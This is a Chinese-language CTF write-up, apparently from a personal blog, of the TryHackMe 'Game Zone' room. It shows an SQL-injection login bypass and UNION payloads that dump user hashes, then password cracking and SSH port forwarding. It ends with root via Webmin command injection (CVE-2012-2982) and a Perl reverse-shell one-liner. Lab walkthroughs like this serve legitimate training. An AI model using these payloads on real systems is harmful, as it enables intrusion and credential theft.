{"title":"Game Zone CTF - TryHackMe.com","uid":"3bda3d0f8b3421f49ec453f4d896421a","slug":"GameZone","date":"2022-04-06T12:43:08.070Z","updated":"2022-04-24T16:58:45.499Z","comments":true,"path":"api/articles/GameZone.json","keywords":null,"cover":"https://andrewhawkeye.oss-cn-beijing.aliyuncs.com/Blog/CTF/tryhackme/gamezone/images.png","content":"<p><a href=\"https://tryhackme.com/room/gamezone\">Game Zone</a>介绍SQLi(通过 SQLMap 手动利用这个漏洞)、破解用户哈希密码、使用SSH隧道显示隐藏服务以及使用metasploit有效负载获得<code>root</code>特权。</p>\n<h1 id=\"搜集信息\"><a href=\"#搜集信息\" class=\"headerlink\" title=\"搜集信息\"></a>搜集信息</h1><p>按照惯例，使用<code>nmap</code>确认靶机上运行的服务，以此来确认我们接下来的步骤。</p>\n<details class=\"custom-details\">\n<summary><code>nmap 10.10.33.139 -sV -A -T4 -oA gamezone</code></summary>\n<p><pre class=\"line-numbers language-shell\" data-language=\"shell\"><code class=\"language-shell\">└─$ sudo nmap 10.10.33.139 -sV -A -T4 -oA gamezone\nStarting Nmap 7.92 ( https:&#x2F;&#x2F;nmap.org ) at 2022-04-06 09:33 EDT\nNmap scan report for 10.10.33.139\nHost is up (0.43s latency).\nNot shown: 998 closed tcp ports (reset)\nPORT   STATE SERVICE VERSION\n22&#x2F;tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   2048 61:ea:89:f1:d4:a7:dc:a5:50:f7:6d:89:c3:af:0b:03 (RSA)\n|   256 b3:7d:72:46:1e:d3:41:b6:6a:91:15:16:c9:4a:a5:fa (ECDSA)\n|_  256 53:67:09:dc:ff:fb:3a:3e:fb:fe:cf:d8:6d:41:27:ab (ED25519)\n80&#x2F;tcp open  http    Apache httpd 2.4.18 ((Ubuntu))\n|_http-title: Game Zone\n|_http-server-header: Apache&#x2F;2.4.18 (Ubuntu)\n| http-cookie-flags:\n|   &#x2F;:\n|     PHPSESSID:\n|_      httponly flag not set\nAggressive OS guesses: Linux 3.10 - 3.13 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.16 (95%), Linux 3.1 (93%), Linux 3.2 (93%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (92%), Linux 3.11 - 3.14 (92%), Linux 3.2 - 4.9 (92%), Linux 3.8 - 4.14 (92%), Oracle VM Server 3.4.2 (Linux 4.1) (92%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 4 hops\nService Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel\n\nTRACEROUTE (using port 80&#x2F;tcp)\nHOP RTT       ADDRESS\n1   178.43 ms 10.4.0.1\n2   ... 3\n4   436.05 ms 10.10.33.139\n\nOS and Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .\nNmap done: 1 IP address (1 host up) scanned in 167.13 seconds<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n</p>\n</details>\n<p>由于目前没有暴力破解或登录SSH的凭据，我们只能先访问在<code>80</code>端口上运行的网站。<br><img src=\"https://andrewhawkeye.oss-cn-beijing.aliyuncs.com/Blog/CTF/tryhackme/gamezone/index.png\" alt=\"index\"></p>\n<h1 id=\"SQL注入\"><a href=\"#SQL注入\" class=\"headerlink\" title=\"SQL注入\"></a>SQL注入</h1><p>在<code>80</code>端口上运行的网站，左侧有一个登录表单。尝试使用万能密码<code>&#39; or 1=1 -- -</code>进行sql注入，这个简单的注入允许我们绕过登录。但是一旦进入”admin panle”，就会有另一个以搜索字段为幌子的SQL注入表单。<br><img src=\"https://andrewhawkeye.oss-cn-beijing.aliyuncs.com/Blog/CTF/tryhackme/gamezone/search.png\" alt=\"search\"></p>\n<p>根据提示，我们搜索首页上展示的游戏<code>Hitman</code>，得到了搜索结果。<br><img src=\"https://andrewhawkeye.oss-cn-beijing.aliyuncs.com/Blog/CTF/tryhackme/gamezone/search_hitman.png\" alt=\"search hitman\"></p>\n<details class=\"custom-details\">\n<summary>SQL注入类型</summary>\n<p>手工验证是否存在SQL注入漏洞，可以通过不同的注入类型进行验证：</p>\n<ul>\n<li>In-band SQLi<ul>\n<li>Error-based SQLi</li>\n<li>Union-based SQLi</li>\n</ul>\n</li>\n<li>Inferential (Blind) SQLi<ul>\n<li>Boolean</li>\n<li>Time-based</li>\n</ul>\n</li>\n<li>Out-of-band SQLi</li>\n</ul>\n\n</details>\n<p><strong>步骤一：确认是否可以进行SQL注入？</strong><br>为了确认搜索输入是否可以被SQL注入，我们可以在搜索框输入单引号<code>&#39;</code>，观察执行后是否存在报错信息，如果存在就说明此处可以被注入。<br><img src=\"https://andrewhawkeye.oss-cn-beijing.aliyuncs.com/Blog/CTF/tryhackme/gamezone/sql-error.png\" alt=\"sql error\"></p>\n<p><strong>步骤二：确认注入字段个数</strong><br>输入<code>hitman&#39; union select 1,2,3 -- -</code>，页面并无报错，且输入内容分别为<code>2,3</code>,说明存在三个字段，其中第一个字段并不输出到页面上。<br><img src=\"https://andrewhawkeye.oss-cn-beijing.aliyuncs.com/Blog/CTF/tryhackme/gamezone/search_union.png\" alt=\"sql union\"><br><strong>步骤三：查询用户信息</strong></p>\n<ul>\n<li>查询表：<code>&#39; UNION select 1,table_schema,table_name from information_schema.tables -- -</code><br><img src=\"https://andrewhawkeye.oss-cn-beijing.aliyuncs.com/Blog/CTF/tryhackme/gamezone/search_table.png\" alt=\"sql table\"></li>\n<li>查询字段：<code>&#39; UNION select 1,table_name,column_name from information_schema.columns where table_name=&#39;users&#39; -- -</code><br><img src=\"https://andrewhawkeye.oss-cn-beijing.aliyuncs.com/Blog/CTF/tryhackme/gamezone/search_users.png\" alt=\"sql users\"></li>\n<li>查询字段内容：<code>&#39; UNION select 1,username, pwd from users -- -</code>，最终获取<code>users</code>表中的所有信息。</li>\n</ul>\n<h1 id=\"JTR爆破密码\"><a href=\"#JTR爆破密码\" class=\"headerlink\" title=\"JTR爆破密码\"></a>JTR爆破密码</h1><p>JTR(Joho the Ripper)是个快速破解密码的开源工具，可用于不同的操作的系统Unix、macOS、Windows、DOS、BeOS和OpenVMS。它的主要是检测弱Unix密码。除了在各种Unix系统中最常见的几种<code>crypt(3)</code>密码哈希类型外，还支持<code>Kerberos/AFS</code>和<code>Windows LM</code>哈希，以及基于DES的<code>tripcode</code>，以及“-jumbo”中的数百个附加哈希和密码版本。</p>\n<details class=\"custom-details\">\n<summary>JTR解密</summary>\n<p><pre class=\"line-numbers language-shell\" data-language=\"shell\"><code class=\"language-shell\">└─$ john hash.txt --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt --format&#x3D;Raw-SHA256\nCreated directory: &#x2F;home&#x2F;andrew&#x2F;.john\nUsing default input encoding: UTF-8\nLoaded 1 password hash (Raw-SHA256 [SHA256 128&#x2F;128 AVX 4x])\nWarning: poor OpenMP scalability for this hash type, consider --fork&#x3D;4\nWill run 4 OpenMP threads\nPress &#39;q&#39; or Ctrl-C to abort, almost any other key for status\n***********    (?)\n1g 0:00:00:00 DONE (2022-04-07 10:22) 3.225g&#x2F;s 9407Kp&#x2F;s 9407Kc&#x2F;s 9407KC&#x2F;s vimivi..veluca\nUse the &quot;--show --format&#x3D;Raw-SHA256&quot; options to display all of the cracked passwords reliably\nSession completed.<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<ul>\n<li><code>hash.txt</code>中包含了我们在上面获取到的pwd字段内容</li>\n<li><code>--wordlist</code>指定查找哈希值的密码列表</li>\n<li><code>format</code>指定使用的哈希算法。</li>\n</ul>\n</p>\n</details>\n<p>使用JTR解密获取了PWD的明文密码，而且靶机开启了SSH服务，我们使用<code>agent47</code>通过<code>SSH</code>登录靶机。</p>\n<details class=\"custom-details\">\n<summary>SSH登录</summary>\n<p><pre class=\"line-numbers language-shell\" data-language=\"shell\"><code class=\"language-shell\">└─$ ssh  agent47@10.10.89.160\nagent47@10.10.89.160&#39;s password:\nWelcome to Ubuntu 16.04.6 LTS (GNU&#x2F;Linux 4.4.0-159-generic x86_64)\n\n * Documentation:  https:&#x2F;&#x2F;help.ubuntu.com\n * Management:     https:&#x2F;&#x2F;landscape.canonical.com\n * Support:        https:&#x2F;&#x2F;ubuntu.com&#x2F;advantage\n\n109 packages can be updated.\n68 updates are security updates.\n\n\nLast login: Thu Apr  7 09:31:33 2022 from 10.4.63.84\nagent47@gamezone:~$ <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n</p>\n</details>\n<h1 id=\"SSH反向隧道\"><a href=\"#SSH反向隧道\" class=\"headerlink\" title=\"SSH反向隧道\"></a>SSH反向隧道</h1><p><img src=\"https://andrewhawkeye.oss-cn-beijing.aliyuncs.com/Blog/CTF/tryhackme/gamezone/cYZsC8p.png\" alt=\"ssh\"><br>SSH反向隧道允许使用已建立的连接来建立从本地计算机返回到远程计算机的新连接。因为最初的连接来自远程计算机，使用它去另一个方向就是“反向”使用它。由于SSH是安全的，因此反向SSH连接置于现有的SSH连接中相当于反向SSH与远程计算机的连接是作为原始连接内的专用隧道。<br>从图中可以看出：</p>\n<ul>\n<li>机器B与机器A建立SSH连接</li>\n<li>当机器A要访问机器C时，通过服务B建立SSH反向隧道进行转发，就可以绕开防火墙访问到机器C上的服务。</li>\n</ul>\n<p><strong>步骤一：查看靶机上存在的套接字连接</strong></p>\n<details class=\"custom-details\">\n<summary>查看套接字连接</summary>\n<p><pre class=\"line-numbers language-shell\" data-language=\"shell\"><code class=\"language-shell\">agent47@gamezone:~$ ss -tulpn\nNetid  State      Recv-Q Send-Q                                                                    Local Address:Port                                                                                   Peer Address:Port\nudp    UNCONN     0      0                                                                                     *:10000                                                                                             *:*\nudp    UNCONN     0      0                                                                                     *:68                                                                                                *:*\ntcp    LISTEN     0      128                                                                                   *:22                                                                                                *:*\ntcp    LISTEN     0      80                                                                            127.0.0.1:3306                                                                                              *:*\ntcp    LISTEN     0      128                                                                                   *:10000                                                                                             *:*\ntcp    LISTEN     0      128                                                                                  :::22                                                                                               :::*\ntcp    LISTEN     0      128     <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<ul>\n<li><code>-t, --tcp</code>: 仅显示 TCP套接字（sockets）</li>\n<li><code>-u, --udp</code>: 仅显示 UCP套接字（sockets）</li>\n<li><code>-l, --listening</code>: 显示监听状态的套接字（sockets）</li>\n<li><code>-p, --processes</code>: 显示使用套接字（socket）的进程</li>\n<li><code>-n, --numeric</code>: 不解析服务名称</li>\n</ul>\n</p>\n</details>\n<p><strong>步骤二：确认可疑端口上运行的服务</strong><br><code>22、80、3306</code>端口可以排除，因为我们知道上面运行的服务是什么。但是<code>10000</code>端口就比较可疑，它并没有出现在全端口扫描的结果中，大概率是防火墙拦截了<code>nmap</code>的扫描请求。</p>\n<details class=\"custom-details\">\n<summary>查看运行在<code>10000</code>端口上的服务</summary>\n<p>查看<code>/etc/iptables/rules.v4</code>的防火墙规则，但是提示当前用户没有权限。</p>\n<pre class=\"line-numbers language-shell\" data-language=\"shell\"><code class=\"language-shell\">agent47@gamezone:~$ cat &#x2F;etc&#x2F;iptables&#x2F;rules.v4\ncat: &#x2F;etc&#x2F;iptables&#x2F;rules.v4: Permission denied<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<p>既然无法确认是否是被防火墙拦截，我们退而求其次，直接使用<code>curl</code>验证是否可以从本地访问。</p>\n<pre class=\"line-numbers language-shell\" data-language=\"shell\"><code class=\"language-shell\">agent47@gamezone:~$ curl 127.0.0.1:10000\n&lt;!doctype html public &quot;-&#x2F;&#x2F;W3C&#x2F;&#x2F;DTD HTML 3.2 Final&#x2F;&#x2F;EN&quot;&gt;\n&lt;html&gt;\n&lt;head&gt;\n&lt;link rel&#x3D;&#39;stylesheet&#39; type&#x3D;&#39;text&#x2F;css&#39; href&#x3D;&#39;&#x2F;unauthenticated&#x2F;style.css&#39; &#x2F;&gt;\n&lt;script type&#x3D;&#39;text&#x2F;javascript&#39; src&#x3D;&#39;&#x2F;unauthenticated&#x2F;toggleview.js&#39;&gt;&lt;&#x2F;script&gt;\n&lt;script&gt;\nvar rowsel &#x3D; new Array();\n&lt;&#x2F;script&gt;\n&lt;script type&#x3D;&#39;text&#x2F;javascript&#39; src&#x3D;&#39;&#x2F;unauthenticated&#x2F;sorttable.js&#39;&gt;&lt;&#x2F;script&gt;\n&lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html; Charset&#x3D;iso-8859-1&quot;&gt;\n&lt;title&gt;Login to Webmin&lt;&#x2F;title&gt;&lt;&#x2F;head&gt;\n&lt;body bgcolor&#x3D;#ffffff link&#x3D;#0000ee vlink&#x3D;#0000ee text&#x3D;#000000    onLoad&#x3D;&#39;document.forms[0].pass.value &#x3D; &quot;&quot;; document.forms[0].user.focus()&#39;&gt;\n......<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n</details>\n<p><strong>步骤三：建立SSH反向隧道</strong></p>\n<details class=\"custom-details\">\n<summary>SSH反向隧道</summary>\n<p><pre class=\"line-numbers language-shell\" data-language=\"shell\"><code class=\"language-shell\">└─$ ssh -L 10000:localhost:10000 -l agent47 10.10.89.160\nagent47@10.10.89.160&#39;s password:\nWelcome to Ubuntu 16.04.6 LTS (GNU&#x2F;Linux 4.4.0-159-generic x86_64)\n\n * Documentation:  https:&#x2F;&#x2F;help.ubuntu.com\n * Management:     https:&#x2F;&#x2F;landscape.canonical.com\n * Support:        https:&#x2F;&#x2F;ubuntu.com&#x2F;advantage\n\n109 packages can be updated.\n68 updates are security updates.\n\n\nLast login: Thu Apr  7 11:51:04 2022 from 10.4.63.84\nagent47@gamezone:~$\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n</p>\n</details>\n<p>建立成功后，访问<code>localhost:100000</code>，就可以看到页面信息了。<br><img src=\"https://andrewhawkeye.oss-cn-beijing.aliyuncs.com/Blog/CTF/tryhackme/gamezone/webmin.png\" alt=\"webmin\"></p>\n<h1 id=\"提权\"><a href=\"#提权\" class=\"headerlink\" title=\"提权\"></a>提权</h1><p><strong>步骤一：确认服务名称和版本信息</strong><br>页面上存在<code>...Webmin server on localhost</code>的提示。通过搜索，得知<b><a href=\"https://www.webmin.com/\">Webmin</a></b>是一个基于Web的Unix系统管理界面。<br>同时页面上存在一个登录表单，但是由于服务做了字符处理，无法使用常用的SQL注入无法进行注入。并且盲猜的成功率不高，我们只能转变思路。</p>\n<details class=\"custom-details\">\n<summary>查看运行的进程服务</summary>\n<p><pre class=\"line-numbers language-shell\" data-language=\"shell\"><code class=\"language-shell\">agent47@gamezone:~$ ps -ef | grep webmin\nroot      1225     1  0 08:51 ?        00:00:00 &#x2F;usr&#x2F;bin&#x2F;perl &#x2F;usr&#x2F;share&#x2F;webmin&#x2F;miniserv.pl &#x2F;etc&#x2F;webmin&#x2F;miniserv.conf<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<p>得知了服务目录，但是权限是<code>root</code>的情况下，我们需要对<code>/etc/webmin/</code>目录下可读的文件进行筛选。</p>\n<pre class=\"line-numbers language-shell\" data-language=\"shell\"><code class=\"language-shell\">\nagent47@gamezone:~$ find &#x2F;etc&#x2F;webmin&#x2F; -perm -444 -print 2&gt;&#x2F;dev&#x2F;null\n&#x2F;etc&#x2F;webmin&#x2F;\n&#x2F;etc&#x2F;webmin&#x2F;restart\n&#x2F;etc&#x2F;webmin&#x2F;module.infos.cache\n&#x2F;etc&#x2F;webmin&#x2F;perl-path\n&#x2F;etc&#x2F;webmin&#x2F;reload\n&#x2F;etc&#x2F;webmin&#x2F;start\n&#x2F;etc&#x2F;webmin&#x2F;stop\n&#x2F;etc&#x2F;webmin&#x2F;var-path\n&#x2F;etc&#x2F;webmin&#x2F;installed.cache\n&#x2F;etc&#x2F;webmin&#x2F;config\n&#x2F;etc&#x2F;webmin&#x2F;version\n&#x2F;etc&#x2F;webmin&#x2F;uninstall.sh<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>在可读文件，我们发现了<code>version</code>文件，查看发现版本号为<code>1.580</code></p>\n</p>\n</details>\n<p>同时我也使用了之前获取的用户名密码进行了测试，发现可以登录成功。<br><img src=\"https://andrewhawkeye.oss-cn-beijing.aliyuncs.com/Blog/CTF/tryhackme/gamezone/webmin_login.png\" alt=\"webmin login sucessful\"></p>\n<p><strong>步骤二：搜索漏洞信息</strong><br>在<a href=\"https://www.exploit-db.com/\">exploit-db</a>搜索到了<a href=\"https://www.exploit-db.com/exploits/21851\">Webmin 1.580 - ‘&#x2F;file&#x2F;show.cgi’ Remote Command Execution (Metasploit)</a>漏洞。</p>\n<details class=\"custom-details\">\n<summary>CVE-2012-2982</summary>\n<p><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">......\nres &#x3D; send_request_cgi(\n\t\t\t&#123;\n\t\t\t\t&#39;uri&#39;     &#x3D;&gt; &quot;&#x2F;file&#x2F;show.cgi&#x2F;bin&#x2F;#&#123;rand_text_alphanumeric(5)&#125;|#&#123;command&#125;|&quot;,\n\t\t\t\t&#39;cookie&#39;  &#x3D;&gt; &quot;sid&#x3D;#&#123;session&#125;&quot;\n\t\t\t&#125;, 25)\n.....<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>这个漏洞显示，如果可以提供任何文件名后面跟着一个管道，就可以进行payload。我们现在已经登录了，可以试试看能不能从远程服务器Ping到本机。</p>\n<pre class=\"line-numbers language-shell\" data-language=\"shell\"><code class=\"language-shell\">\n└─$ sudo tcpdump -i tun0 icmp\ntcpdump: verbose output suppressed, use -v[v]... for full protocol decode\nlistening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://andrewhawkeye.oss-cn-beijing.aliyuncs.com/Blog/CTF/tryhackme/gamezone/webmin_ping.png\" alt=\"webmin ping\"></p>\n<pre class=\"line-numbers language-shell\" data-language=\"shell\"><code class=\"language-shell\">└─$ sudo tcpdump -i tun0 icmp\ntcpdump: verbose output suppressed, use -v[v]... for full protocol decode\nlistening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes\n14:15:29.223239 IP 10.10.89.160 &gt; 10.4.63.84: ICMP echo request, id 4156, seq 1, length 64\n14:15:29.223251 IP 10.4.63.84 &gt; 10.10.89.160: ICMP echo reply, id 4156, seq 1, length 64\n14:15:30.224699 IP 10.10.89.160 &gt; 10.4.63.84: ICMP echo request, id 4156, seq 2, length 64\n14:15:30.224719 IP 10.4.63.84 &gt; 10.10.89.160: ICMP echo reply, id 4156, seq 2, length 64\n14:15:31.226321 IP 10.10.89.160 &gt; 10.4.63.84: ICMP echo request, id 4156, seq 3, length 64\n14:15:31.226340 IP 10.4.63.84 &gt; 10.10.89.160: ICMP echo reply, id 4156, seq 3, length 64<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n</p>\n</details>\n<p><strong>步骤三：利用漏洞提权</strong></p>\n<details class=\"custom-details\">\n<summary>利用prel reverse脚本获取反向shell</summary>\n<p>开启<code>netcat</code>监听。</p>\n<pre class=\"line-numbers language-shell\" data-language=\"shell\"><code class=\"language-shell\">└─$ rlwrap nc -lvnp 4242\nNcat: Version 7.92 ( https:&#x2F;&#x2F;nmap.org&#x2F;ncat )\nNcat: Listening on :::4242\nNcat: Listening on 0.0.0.0:4242<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>将刚才的<code>ping</code>命令替换为反向shell脚本。</p>\n<pre class=\"line-numbers language-prel\" data-language=\"prel\"><code class=\"language-prel\">perl -e &#39;use Socket;$i&#x3D;&quot;10.0.0.1&quot;;$p&#x3D;4242;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;&#x2F;bin&#x2F;sh -i&quot;);&#125;;&#39;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>成功获取了反向Shell。</p>\n<pre class=\"line-numbers language-shell\" data-language=\"shell\"><code class=\"language-shell\">└─$ rlwrap nc -lvnp 4242\nNcat: Version 7.92 ( https:&#x2F;&#x2F;nmap.org&#x2F;ncat )\nNcat: Listening on :::4242\nNcat: Listening on 0.0.0.0:4242\nNcat: Connection from 10.10.89.160.\nNcat: Connection from 10.10.89.160:33398.\n&#x2F;bin&#x2F;sh: 0: can&#39;t access tty; job control turned off\nwhoami\nroot<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n</details>\n<h1 id=\"工具\"><a href=\"#工具\" class=\"headerlink\" title=\"工具\"></a>工具</h1><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><ul>\n<li>Namp</li>\n<li>MetaSploit</li>\n<li>SQLMap</li>\n<li><a href=\"https://github.com/openwall/john\">John the Ripper</a></li>\n<li><a href=\"https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md\">PayloadsAllTheThings</a></li>\n</ul></blockquote>\n<h1 id=\"参考文档\"><a href=\"#参考文档\" class=\"headerlink\" title=\"参考文档\"></a>参考文档</h1><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><ul>\n<li><a href=\"https://www.imperva.com/learn/application-security/sql-injection-sqli/\">SQL (Structured query language) Injection</a></li>\n<li><a href=\"https://pentestmonkey.net/cheat-sheet/john-the-ripper-hash-formats\">John The Ripper Hash Formats</a></li>\n<li><a href=\"https://www.net7.be/blog/article/network_activity_analysis_1_netstat.html\">Analysing network activity #1 - netstat, ss and lsof</a></li>\n<li><a href=\"https://www.howtogeek.com/428413/what-is-reverse-ssh-tunneling-and-how-to-use-it/\">What Is Reverse SSH Tunneling? (and How to Use It)</a></li>\n<li><a href=\"https://jfrog.com/connect/post/reverse-ssh-tunneling-from-start-to-end/\">Reverse SSH Tunneling - From Start to End</a></li>\n</ul></blockquote>\n","text":"Game Zone介绍SQLi(通过 SQLMap 手动利用这个漏洞)、破解用户哈希密码、使用SSH隧道显示隐藏服务以及使用metasploit有效负载获得root特权。 搜集信息按照惯例，使用nmap确认靶机上运行的服务，以此来确认我们接下来的步骤。 nmap 10.10.33...","link":"","photos":[],"count_time":{"symbolsCount":"12k","symbolsTime":"10 mins."},"categories":[{"name":"CTF","slug":"CTF","count":6,"path":"api/categories/CTF.json"}],"tags":[{"name":"Linux Privilege Escalation","slug":"Linux-Privilege-Escalation","count":3,"path":"api/tags/Linux-Privilege-Escalation.json"},{"name":"tryhackme","slug":"tryhackme","count":6,"path":"api/tags/tryhackme.json"},{"name":"SQLi","slug":"SQLi","count":1,"path":"api/tags/SQLi.json"},{"name":"Reverse SSH tunnel","slug":"Reverse-SSH-tunnel","count":1,"path":"api/tags/Reverse-SSH-tunnel.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E6%90%9C%E9%9B%86%E4%BF%A1%E6%81%AF\"><span class=\"toc-text\">搜集信息</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#SQL%E6%B3%A8%E5%85%A5\"><span class=\"toc-text\">SQL注入</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#JTR%E7%88%86%E7%A0%B4%E5%AF%86%E7%A0%81\"><span class=\"toc-text\">JTR爆破密码</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#SSH%E5%8F%8D%E5%90%91%E9%9A%A7%E9%81%93\"><span class=\"toc-text\">SSH反向隧道</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E6%8F%90%E6%9D%83\"><span class=\"toc-text\">提权</span></a></li><li 